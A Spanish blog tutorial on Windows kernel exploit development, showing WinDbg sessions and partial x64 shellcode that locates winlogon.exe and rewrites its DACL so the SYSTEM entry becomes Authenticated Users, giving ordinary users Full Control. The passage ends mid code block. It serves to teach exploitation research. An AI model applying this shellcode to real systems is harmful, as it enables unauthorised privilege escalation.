<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>ACL Editing</title>

  <meta name="description" content="Creación de shellcode para acl editing en modo kernel">
  <meta name="author" content="DarthBear">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="ACL Editing">
  <meta name="twitter:description" content="Creación de shellcode para acl editing en modo kernel">
  <meta name="twitter:creator" content="DarthBear">  
  <meta name="twitter:image" content="/exploit-development/windows-kernel/acl-editing/image.png" />

  <meta property="og:site_name" content="DarthBear" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="ACL Editing">
  <meta property="og:description" content="Creación de shellcode para acl editing en modo kernel">
  <meta property="og:image" content="/exploit-development/windows-kernel/acl-editing/image.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/exploit-development/windows-kernel/acl-editing/image.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="ACL Editing" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="DarthBear">
          <h1 class="panel-cover__title panel-title scale-up-center">DarthBear</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/exploit-development/windows-kernel" title="DarthBear" class="blog-button">Windows Kernel Mode</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/kevincillo32" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://x.com/Bear00652327128" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/kevinch1106" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://www.youtube.com/@darthbear3654" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:kevincillo32@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#nulling">Nulling</a></li>
        <li><a href="#shellcode">Shellcode</a></li>
        <li><a href="#cleanup">Cleanup</a></li>
        <li><a href="#usage">Usage</a></li>
    </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Exploit Development</h2>
    <picture><img src="/exploit-development/windows-kernel/acl-editing/image.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">ACL Editing</h2><br>
  </header>

<p class="plain-text">Como continuación al <a href="/exploit-development/windows-kernel/token-stealing">post</a> anterior donde para elevar privilegios robabamos el token del proceso <code class="language-plaintext highlighter-rouge">SYSTEM</code> y lo copiabamos al actual analizaremos otro método que es anulando la <code class="language-plaintext highlighter-rouge">ACL</code> de un proceso del sistema como <code class="language-plaintext highlighter-rouge">winlogon.exe</code> para que cualquier usuario tenga <code class="language-plaintext highlighter-rouge">Full Control</code> sobre el, aunque en versiones actuales ya no funciona buscaremos una alternativa para hacer algo similar en la última versión</p>

<section class="post" id="nulling">
<br><h3 class="post-title">Nulling</h3><br>

<p class="plain-text">Iniciemos analizando la <code class="language-plaintext highlighter-rouge">ACL</code> que guarda los privilegios, el proceso que utilizaremos para el shellcode es <code class="language-plaintext highlighter-rouge">winlogon.exe</code>, este no tiene un pid fijo pero es un proceso que siempre tendrá privilegios administrativos, con <code class="language-plaintext highlighter-rouge">!object</code> podemos obtener el <code class="language-plaintext highlighter-rouge">Header</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">!process 0 0 winlogon.exe
PROCESS ffffe20d3e19c080
    SessionId: 1  Cid: 0254    Peb: f901e13000  ParentCid: 01fc
    DirBase: 10bbbf000  ObjectTable: ffff9e8c274a0b00  HandleCount: 281.  
    Image: winlogon.exe

</span><span class="ro">0: kd></span><span class="p"> !object 0xffffe20d3e19c080
Object: ffffe20d3e19c080  Type: (ffffe20d3acb17a0) Process
    ObjectHeader: ffffe20d3e19c050 (new version)
    HandleCount: 15  PointerCount: 458230</span>
</code></pre></div></div><br>

<p class="plain-text">La estructura <code class="language-plaintext highlighter-rouge">_OBJECT_HEADER</code> de cada proceso contiene un atributo interesante llamado <code class="language-plaintext highlighter-rouge">SecurityDescriptor</code> en el offset <code class="language-plaintext highlighter-rouge">0x28</code>, este atributo contiene la <code class="language-plaintext highlighter-rouge">ACL</code> del objeto y esta define quien puede acceder al objeto y con que permisos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_OBJECT_HEADER 0xffffe20d3e19c050
   +0x000 PointerCount     : 0n458230
   +0x008 HandleCount      : 0n15
   +0x008 NextToFree       : 0x00000000`0000000f Void
   +0x010 Lock             : _EX_PUSH_LOCK
   +0x018 TypeIndex        : 0xde ''
   +0x019 TraceFlags       : 0 ''
   +0x019 DbgRefTrace      : 0y0
   +0x019 DbgTracePermanent : 0y0
   +0x01a InfoMask         : 0x88 ''
   +0x01b Flags            : 0 ''
   +0x01b NewObject        : 0y0
   +0x01b KernelObject     : 0y0
   +0x01b KernelOnlyAccess : 0y0
   +0x01b ExclusiveObject  : 0y0
   +0x01b PermanentObject  : 0y0
   +0x01b DefaultSecurityQuota : 0y0
   +0x01b SingleHandleEntry : 0y0
   +0x01b DeletedInline    : 0y0
   +0x01c Reserved         : 0x8930eb74
   +0x020 ObjectCreateInfo : 0xfffff800`6ae53a40 _OBJECT_CREATE_INFORMATION  
   +0x020 QuotaBlockCharged : 0xfffff800`6ae53a40 Void
   +0x028 SecurityDescriptor : 0xffff9e8c`1fa47e2d Void
   +0x030 Body             : _QUAD</span>
</code></pre></div></div><br>

<p class="plain-text">En explotaciones realizadas en versiones antiguas de <code class="language-plaintext highlighter-rouge">Windows 10</code> simplemente podiamos anular el <code class="language-plaintext highlighter-rouge">SecurityDescriptor</code>, como resultado si mirabamos con <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a> los permisos de un proceso se podia ver de esta forma y al no estar asignado a nadie cualquier usuario tenia <code class="language-plaintext highlighter-rouge">Full Control</code> sobre él, sin embargo esto cambió para versiones mas nuevas como explica la siguiente <a href="https://labs.nettitude.com/blog/analysing-the-null-securitydescriptor-kernel-exploitation-mitigation-in-the-latest-windows-10-v1607-build-14393/">investigación</a> de nettitude</p>
<a href="/exploit-development/windows-kernel/acl-editing/4.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/acl-editing/4.png"></p></div></a>

<p class="plain-text">Si en una versión actual de <code class="language-plaintext highlighter-rouge">Windows</code> anulamos el <code class="language-plaintext highlighter-rouge">SecurityDescriptor</code> el resultado es un <code class="language-plaintext highlighter-rouge">BSOD</code> de tipo <a href="https://learn.microsoft.com/es-es/windows-hardware/drivers/debugger/bug-check-0x189--bad-object-header">BAD_OBJECT_HEADER</a> diciendo que tiene un valor inválido</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> eq 0xffffe20d3e19c050 + 0x28 0

</span><span class="ro">0: kd></span><span class="p"> g
KDTARGET: Refreshing KD connection
*** Fatal System Error: 0x00000189 (0xFFFFE20D3E19C050,0xFFFFE20D416127F0,0x0000000000000001,0x0000000000000000)  

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

nt!DbgBreakPointWithStatus:
fffff803`2a6077a0 cc              int     3

</span><span class="ro">0: kd></span><span class="p"> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

BAD_OBJECT_HEADER (189)
The OBJECT_HEADER has been corrupted
Arguments:
Arg1: ffffe20d3e19c050, Pointer to bad OBJECT_HEADER
Arg2: ffffe20d416127f0, Pointer to the resulting OBJECT_TYPE based on the TypeIndex in the OBJECT_HEADER
Arg3: 0000000000000001, The object security descriptor is invalid.
Arg4: 0000000000000000, Reserved.</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-kernel/acl-editing/1.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/acl-editing/1.png"></p></div></a>

<p class="plain-text">Lo único que nos queda es buscar una forma de asignar privilegios <code class="language-plaintext highlighter-rouge">Full Control</code> sin anularlo, para ello tendremos que entender como funciona el <code class="language-plaintext highlighter-rouge">SecurityDescriptor</code>, lo interesante de la estructura <code class="language-plaintext highlighter-rouge">_SECURITY_DESCRIPTOR</code> es el atributo <code class="language-plaintext highlighter-rouge">Dacl</code> que es una estructura <code class="language-plaintext highlighter-rouge">_ACL</code> que especifica el acceso que tienen los usuarios al objeto</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt nt!_SECURITY_DESCRIPTOR
   +0x000 Revision         : UChar
   +0x001 Sbz1             : UChar
   +0x002 Control          : Uint2B
   +0x008 Owner            : Ptr64 Void  
   +0x010 Group            : Ptr64 Void  
   +0x018 Sacl             : Ptr64 _ACL  
   +0x020 Dacl             : Ptr64 _ACL  
  
</span><span class="ro">0: kd></span><span class="p"> dt nt!_ACL
   +0x000 AclRevision      : UChar
   +0x001 Sbz1             : UChar
   +0x002 AclSize          : Uint2B
   +0x004 AceCount         : Uint2B
   +0x006 Sbz2             : Uint2B</span>
</code></pre></div></div><br>

<p class="plain-text">Según <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-access_allowed_ace">documentación</a> en realidad el objeto <code class="language-plaintext highlighter-rouge">_ACL</code> solo es un <code class="language-plaintext highlighter-rouge">Header</code> y el contenido real se encuentra en sus entradas, para una <code class="language-plaintext highlighter-rouge">Dacl</code> hay 2 tipos de <code class="language-plaintext highlighter-rouge">ACE</code>, estos son <code class="language-plaintext highlighter-rouge">ACCESS_ALLOWED_ACE</code> y <code class="language-plaintext highlighter-rouge">ACCESS_DENIED_ACE</code>, nos interesa el primero que indica que derechos tiene un <code class="language-plaintext highlighter-rouge">SID</code> a través del atributo <code class="language-plaintext highlighter-rouge">ACCESS_MASK</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">typedef struct</span><span class="na"> _ACCESS_ALLOWED_ACE </span><span class="p">{  
  </span><span class="no">ACE_HEADER</span><span class="p">  Header;
  </span><span class="no">ACCESS_MASK</span><span class="p"> Mask;
  </span><span class="no">DWORD</span><span class="p">       SidStart;
}</span><span class="na"> ACCESS_ALLOWED_ACE</span><span class="p">;</span>
</code></pre></div></div><br>

<p class="plain-text">Utilizando el comando <code class="language-plaintext highlighter-rouge">!sd</code> podemos pasarle un puntero al <code class="language-plaintext highlighter-rouge">SecurityDescriptor</code> antes limpiando el último byte y obtener información de este, este nos muestra detalladamente que usuarios tienen que privilegios, el <code class="language-plaintext highlighter-rouge">AceCount</code> de la <code class="language-plaintext highlighter-rouge">DACL</code> es <code class="language-plaintext highlighter-rouge">2</code> lo que significa que contiene <code class="language-plaintext highlighter-rouge">2 ACE</code> y ambos son de tipo <code class="language-plaintext highlighter-rouge">ACCESS_ALLOWED_ACE</code>, uno es para <code class="language-plaintext highlighter-rouge">nt authority\system</code> y el otro para el grupo <code class="language-plaintext highlighter-rouge">builtin\administradores</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> !sd (0xffff9e8c1fa47e2d & 0xfffffffffffffff0) 1
->Revision: 0x1
->Sbz1    : 0x0
->Control : 0x8814
            SE_DACL_PRESENT
            SE_SACL_PRESENT
            SE_SACL_AUTO_INHERITED
            SE_SELF_RELATIVE
->Owner   : S-1-5-32-544 (Alias: BUILTIN\Administradores)
->Group   : S-1-5-18 (Well Known Group: NT AUTHORITY\SYSTEM)
->Dacl    : 
->Dacl    : ->AclRevision: 0x2
->Dacl    : ->Sbz1       : 0x0
->Dacl    : ->AclSize    : 0x3c
->Dacl    : ->AceCount   : 0x2
->Dacl    : ->Sbz2       : 0x0
->Dacl    : ->Ace[0]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[0]: ->AceFlags: 0x0
->Dacl    : ->Ace[0]: ->AceSize: 0x14
->Dacl    : ->Ace[0]: ->Mask : 0x001fffff
->Dacl    : ->Ace[0]: ->SID: S-1-5-18 (Well Known Group: NT AUTHORITY\SYSTEM)

->Dacl    : ->Ace[1]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[1]: ->AceFlags: 0x0
->Dacl    : ->Ace[1]: ->AceSize: 0x18
->Dacl    : ->Ace[1]: ->Mask : 0x00121411
->Dacl    : ->Ace[1]: ->SID: S-1-5-32-544 (Alias: BUILTIN\Administradores)

->Sacl    : 
->Sacl    : ->AclRevision: 0x2
->Sacl    : ->Sbz1       : 0x0
->Sacl    : ->AclSize    : 0x1c
->Sacl    : ->AceCount   : 0x1
->Sacl    : ->Sbz2       : 0x0
->Sacl    : ->Ace[0]: ->AceType: SYSTEM_MANDATORY_LABEL_ACE_TYPE
->Sacl    : ->Ace[0]: ->AceFlags: 0x0
->Sacl    : ->Ace[0]: ->AceSize: 0x14
->Sacl    : ->Ace[0]: ->Mask : 0x00000003
->Sacl    : ->Ace[0]: ->SID: S-1-16-16384 (Label: Etiqueta obligatoria\Nivel obligatorio del sistema)  </span>
</code></pre></div></div><br>

<p class="plain-text">Esto podemos verlo graficamente desde <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a> donde <code class="language-plaintext highlighter-rouge">nt authority\system</code> tiene privilegios <code class="language-plaintext highlighter-rouge">Full Control</code>, la forma que usaremos para tener este acceso será modificar el <code class="language-plaintext highlighter-rouge">SID</code> de <code class="language-plaintext highlighter-rouge">SYSTEM</code> para asignar estos privilegios a otro grupo con menos privilegios con el que podamos acceder por ejemplo <code class="language-plaintext highlighter-rouge">Usuarios autenticados</code></p>
<a href="/exploit-development/windows-kernel/acl-editing/2.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/acl-editing/2.png"></p></div></a>

</section>

<section class="post" id="shellcode">
<br><h3 class="post-title">Shellcode</h3><br>

<p class="plain-text">El plan es cambiar el byte del <code class="language-plaintext highlighter-rouge">SID</code> desde un shellcode, para ello necesitaremos obtener la dirección del proceso actual para recorrer la lista enlazada hasta encontrar el proceso de <code class="language-plaintext highlighter-rouge">winlogon.exe</code>, según documentación la función <code class="language-plaintext highlighter-rouge">PsGetCurrentProcess</code> deberia devolver un puntero al <code class="language-plaintext highlighter-rouge">EPROCESS</code> actual que usaremos como base</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> u nt!PsGetCurrentProcess L3  
nt!PsGetCurrentProcess:
fffff807`04086700 65488b042588010000 mov   rax,qword ptr gs:[188h]
fffff807`04086709 488b80b8000000     mov   rax,qword ptr [rax+0B8h]
fffff807`04086710 c3                 ret

</span><span class="ro">0: kd></span><span class="p"> dqs gs:[0x188] L1
002b:00000000`00000188  ffff8688`a5cdf080</span>
</code></pre></div></div><br>

<p class="plain-text">Iniciemos con la escritura del shellcode, las instrucciones de <code class="language-plaintext highlighter-rouge">PsGetCurrentProcess</code> nos servirán para obtener la dirección del proceso actual y después lo guardamos en <code class="language-plaintext highlighter-rouge">rbx</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]              </span><span class="c1">; $rdx = _KTHREAD
    </span><span class="o">mov</span><span class="mi"> rax</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0xb8</span><span class="p">]            </span><span class="c1">; $rax = _EPROCESS  
    </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">rax</span><span class="c1">                     ; $rbx = _EPROCESS</span>  
</code></pre></div></div><br>

<p class="plain-text">Un elemento interesante de <code class="language-plaintext highlighter-rouge">_EPROCESS</code> es el campo <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code> que es una estructura <code class="language-plaintext highlighter-rouge">_LIST_ENTRY</code>, esta es una lista doblemente enlazada que quiere decir que cada elemento apunta al anterior y siguiente elemento, esta lista se encarga del registro de los procesos activos por lo que deberiamos encontrar a <code class="language-plaintext highlighter-rouge">winlogon.exe</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x438 ProcessLock      : _EX_PUSH_LOCK
   +0x440 UniqueProcessId  : Ptr64 Void
   +0x448 ActiveProcessLinks : _LIST_ENTRY
   +0x458 RundownProtect   : _EX_RUNDOWN_REF
   +0x460 Flags2           : Uint4B

</span><span class="ro">0: kd></span><span class="p"> dt nt!_LIST_ENTRY
   +0x000 Flink            : Ptr64 _LIST_ENTRY  
   +0x008 Blink            : Ptr64 _LIST_ENTRY  </span>
</code></pre></div></div><br>

<p class="plain-text">En el offset <code class="language-plaintext highlighter-rouge">0x5a8</code> de <code class="language-plaintext highlighter-rouge">_EPROCESS</code> encontramos un atributo <code class="language-plaintext highlighter-rouge">ImageFileName</code>, este contiene el nombre del proceso en <code class="language-plaintext highlighter-rouge">ascii</code>, será util para localizar el proceso</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_EPROCESS 0xffffe20d3e19c080 ImageFileName  
   +0x5a8 ImageFileName : [15]  "winlogon.exe"</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos escribir un bucle que se encargue de recorrer la lista enlazada y comparar la cadena <code class="language-plaintext highlighter-rouge">winlogon</code> guardada en <code class="language-plaintext highlighter-rouge">rcx</code> con el valor en el offset <code class="language-plaintext highlighter-rouge">0x5a8</code>, cuando la comparación sea exitosa significa que ha encontrado el proceso <code class="language-plaintext highlighter-rouge">winlogon.exe</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">loop</span><span class="p">:
        </span><span class="o">mov</span><span class="mi"> rbx</span><span class="p">, [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x448</span><span class="p">]</span><span class="c1">              ; $rbx = ActiveProcessLinks
        </span><span class="o">sub</span><span class="mi"> rbx</span><span class="p">, </span><span class="mi">0x448</span><span class="c1">                      ; $rbx = _EPROCESS
        </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, </span><span class="mi">0x6e6f676f6c6e6977</span><span class="c1">         ; $rcx = "winlogon"
        </span><span class="o">cmp</span><span class="no"> qword</span><span class="p"> [</span><span class="mi">rbx</span><span class="o"> +</span><span class="mi"> 0x5a8</span><span class="p">],</span><span class="mi"> rcx</span><span class="c1">        ; ImageFileName == "winlogon"  
        </span><span class="o">jnz .</span><span class="na">loop</span>
</code></pre></div></div><br>

<p class="plain-text">Según la estructura <code class="language-plaintext highlighter-rouge">_SECURITY_DESCRIPTOR</code> la estructura <code class="language-plaintext highlighter-rouge">_ACL</code> de <code class="language-plaintext highlighter-rouge">Dacl</code> se encuentra en el offset <code class="language-plaintext highlighter-rouge">0x20</code> sin embargo los valores que obtenemos son incorrectos pero si usamos un offset de <code class="language-plaintext highlighter-rouge">0x30</code> obtenemos los valores reales, esto es bastante curioso y probablemente se deba a que los simbolos no estan actualizados en windbg</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt nt!_SECURITY_DESCRIPTOR
   +0x000 Revision         : UChar
   +0x001 Sbz1             : UChar
   +0x002 Control          : Uint2B
   +0x008 Owner            : Ptr64 Void
   +0x010 Group            : Ptr64 Void
   +0x018 Sacl             : Ptr64 _ACL
   +0x020 Dacl             : Ptr64 _ACL

</span><span class="ro">0: kd></span><span class="p"> dt nt!_ACL 0xffff9e8c1fa47e20 + 0x20  
   +0x000 AclRevision      : 0x3 ''
   +0x001 Sbz1             : 0 ''
   +0x002 AclSize          : 0
   +0x004 AceCount         : 0x101
   +0x006 Sbz2             : 0

</span><span class="ro">0: kd></span><span class="p"> dt nt!_ACL 0xffff9e8c1fa47e20 + 0x30
   +0x000 AclRevision      : 0x2 ''
   +0x001 Sbz1             : 0 ''
   +0x002 AclSize          : 0x3c
   +0x004 AceCount         : 2
   +0x006 Sbz2             : 0</span>
</code></pre></div></div><br>

<p class="plain-text">El <code class="language-plaintext highlighter-rouge">Header</code> de la <code class="language-plaintext highlighter-rouge">ACL</code> ocupa <code class="language-plaintext highlighter-rouge">8</code> bytes, seguido de los <code class="language-plaintext highlighter-rouge">ACE</code> donde cada uno comienza con una estructura <code class="language-plaintext highlighter-rouge">_ACE_HEADER</code> que si sumamos sus valores pesa <code class="language-plaintext highlighter-rouge">4</code> bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">typedef</span><span class="na"> struct _ACE_HEADER </span><span class="p">{  
  </span><span class="no">UCHAR</span><span class="p">  AceType;
  </span><span class="no">UCHAR</span><span class="p">  AceFlags;
  </span><span class="no">USHORT</span><span class="p"> AceSize;
} </span><span class="na">ACE_HEADER</span><span class="p">;</span>
</code></pre></div></div><br>

<p class="plain-text">Si realizamos un volcado hexadecimal podemos ver esos <code class="language-plaintext highlighter-rouge">12</code> bytes de antes y el siguiente <code class="language-plaintext highlighter-rouge">dword</code> pertenece a <code class="language-plaintext highlighter-rouge">Mask</code> que en este caso es <code class="language-plaintext highlighter-rouge">0x1fffff</code>, esto nos dice que el <code class="language-plaintext highlighter-rouge">SID</code> inicia en el offset <code class="language-plaintext highlighter-rouge">0x40</code>, en el offset <code class="language-plaintext highlighter-rouge">0x41</code> podemos ver el byte <code class="language-plaintext highlighter-rouge">0x1</code>, en el offset <code class="language-plaintext highlighter-rouge">0x47</code> el byte <code class="language-plaintext highlighter-rouge">0x5</code> y finalmente en el offset <code class="language-plaintext highlighter-rouge">0x48</code> el byte <code class="language-plaintext highlighter-rouge">0x12</code>, si pasamos los valores a decimal coincide con el SID <code class="language-plaintext highlighter-rouge">S-1-5-18</code> que pertenece a <code class="language-plaintext highlighter-rouge">SYSTEM</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> db 0xffff9e8c1fa47e20 + 0x30
ffff9e8c`1fa47e50  02 00 3c 00 02 00 00 00-00 00 14 00 ff ff 1f 00  ..<.............  
ffff9e8c`1fa47e60  01 01 00 00 00 00 00 05-12 00 00 00 00 00 18 00  ................  
ffff9e8c`1fa47e70  11 14 12 00 01 02 00 00-00 00 00 05 20 00 00 00  ............ ...  
ffff9e8c`1fa47e80  20 02 00 00 00 00 00 00-00 00 00 00 01 02 00 00   ...............  
ffff9e8c`1fa47e90  00 00 00 05 20 00 00 00-20 02 00 00 01 01 00 00  .... ... .......  
ffff9e8c`1fa47ea0  00 00 00 05 12 00 00 00-bd ba 00 00 01 bb 00 00  ................  
ffff9e8c`1fa47eb0  a2 bb 00 00 19 bd 00 00-64 7d 02 00 e9 7d 02 00  ........d}...}..  
ffff9e8c`1fa47ec0  24 be 00 00 6b be 00 00-a4 7e 02 00 4d bf 00 00  $...k....~..M...  </span>
</code></pre></div></div><br>

<p class="plain-text">Entonces la idea es simple, cambiar ese byte <code class="language-plaintext highlighter-rouge">0x12</code> o <code class="language-plaintext highlighter-rouge">18</code> en decimal por <code class="language-plaintext highlighter-rouge">0xb</code> o <code class="language-plaintext highlighter-rouge">11</code> en decimal, el SID ahora tendra el valor <code class="language-plaintext highlighter-rouge">S-1-5-11</code> que segun <a href="https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-identifiers#well-known-sids">documentación</a> pertenece a <code class="language-plaintext highlighter-rouge">Usuarios autenticados</code> donde deberiamos pertenecer en teoría</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> db 0xffff9e8c1fa47e20 + 0x48 L1
ffff9e8c`1fa47e68  12

</span><span class="ro">0: kd></span><span class="p"> eb 0xffff9e8c1fa47e20 + 0x48 0xb  </span>
</code></pre></div></div><br>

<p class="plain-text">Luego de modificar el valor podemos usar nuevamente <code class="language-plaintext highlighter-rouge">!sd</code> para ver los valores y el grupo <code class="language-plaintext highlighter-rouge">Usuarios autenticados</code> tiene los privilegios que antes tenía <code class="language-plaintext highlighter-rouge">SYSTEM</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> !sd (0xffff9e8c1fa47e2d & 0xfffffffffffffff0) 1
->Revision: 0x1
->Sbz1    : 0x0
->Control : 0x8814
            SE_DACL_PRESENT
            SE_SACL_PRESENT
            SE_SACL_AUTO_INHERITED
            SE_SELF_RELATIVE
->Owner   : S-1-5-32-544 (Alias: BUILTIN\Administradores)
->Group   : S-1-5-18 (Well Known Group: NT AUTHORITY\SYSTEM)
->Dacl    : 
->Dacl    : ->AclRevision: 0x2
->Dacl    : ->Sbz1       : 0x0
->Dacl    : ->AclSize    : 0x3c
->Dacl    : ->AceCount   : 0x2
->Dacl    : ->Sbz2       : 0x0
->Dacl    : ->Ace[0]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[0]: ->AceFlags: 0x0
->Dacl    : ->Ace[0]: ->AceSize: 0x14
->Dacl    : ->Ace[0]: ->Mask : 0x001fffff
->Dacl    : ->Ace[0]: ->SID: S-1-5-11 (Well Known Group: NT AUTHORITY\Usuarios autentificados)

->Dacl    : ->Ace[1]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[1]: ->AceFlags: 0x0
->Dacl    : ->Ace[1]: ->AceSize: 0x18
->Dacl    : ->Ace[1]: ->Mask : 0x00121411
->Dacl    : ->Ace[1]: ->SID: S-1-5-32-544 (Alias: BUILTIN\Administradores)

->Sacl    : 
->Sacl    : ->AclRevision: 0x2
->Sacl    : ->Sbz1       : 0x0
->Sacl    : ->AclSize    : 0x1c
->Sacl    : ->AceCount   : 0x1
->Sacl    : ->Sbz2       : 0x0
->Sacl    : ->Ace[0]: ->AceType: SYSTEM_MANDATORY_LABEL_ACE_TYPE
->Sacl    : ->Ace[0]: ->AceFlags: 0x0
->Sacl    : ->Ace[0]: ->AceSize: 0x14
->Sacl    : ->Ace[0]: ->Mask : 0x00000003
->Sacl    : ->Ace[0]: ->SID: S-1-16-16384 (Label: Etiqueta obligatoria\Nivel obligatorio del sistema)  </span>
</code></pre></div></div><br>

<p class="plain-text">Si lo vemos ahora desde Process Explorer nos refleja los permisos <code class="language-plaintext highlighter-rouge">Full Control</code></p>
<a href="/exploit-development/windows-kernel/acl-editing/3.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/acl-editing/3.png"></p></div></a>

<p class="plain-text">Desde nuestro código se ve de la siguiente forma, guardamos el <code class="language-plaintext highlighter-rouge">SecurityDescriptor</code> de <code class="language-plaintext highlighter-rouge">winlogon.exe</code> limpiando el ultimo byte y en el offset <code class="language-plaintext highlighter-rouge">0x48</code> escribimos el byte <code class="language-plaintext highlighter-rouge">0xb</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
